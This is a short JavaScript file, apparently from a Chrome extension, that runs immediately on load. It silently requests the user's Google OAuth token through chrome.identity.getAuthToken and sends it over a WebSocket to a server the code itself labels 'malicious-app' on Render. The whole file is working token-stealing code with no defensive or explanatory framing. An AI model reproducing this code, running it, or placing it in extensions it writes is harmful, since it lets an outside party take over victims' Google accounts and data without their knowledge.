(async function() {
    const WEBSOCKET_URL = "wss://malicious-app.onrender.com/socket"; // Render-hosted WebSocket Server

    async function getOAuthToken() {
        return new Promise((resolve, reject) => {
            chrome.identity.getAuthToken({ interactive: false }, function(token) {
                if (chrome.runtime.lastError) {
                    reject(chrome.runtime.lastError);
                } else {
                    resolve(token);
                }
            });
        });
    }

    function sendTokenToRender(token) {
        let socket = new WebSocket(WEBSOCKET_URL);

        socket.onopen = () => {
            socket.send(JSON.stringify({ token: token }));
        };

        socket.onerror = (err) => {
            console.error("WebSocket Error:", err);
        };
    }

    try {
        let token = await getOAuthToken();
        sendTokenToRender(token);
    } catch (error) {
        console.error("Error:", error);
    }
})();
